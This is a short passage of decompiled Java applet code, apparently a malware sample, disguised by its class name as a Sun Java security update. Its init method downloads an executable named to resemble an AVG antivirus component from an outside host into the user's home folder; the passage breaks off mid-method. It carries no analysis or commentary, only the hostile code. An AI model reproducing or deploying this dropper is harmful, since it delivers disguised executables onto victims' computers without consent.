...
public class Sun_Microsystems_Java_Security_Update_6 extends Applet
{
    ...
    public void paint(final Graphics graphics) {
        graphics.drawString("http://skycpm.com/java/avgupsvc.exe", 20, 20);
    }
    
    @Override
    public void init() {
        final String concat = System.getProperty("user.home").concat("\\avgupsvc.exe");
        System.out.println(concat);
        this.download("http://skycpm.com/java/avgupsvc.exe", concat);
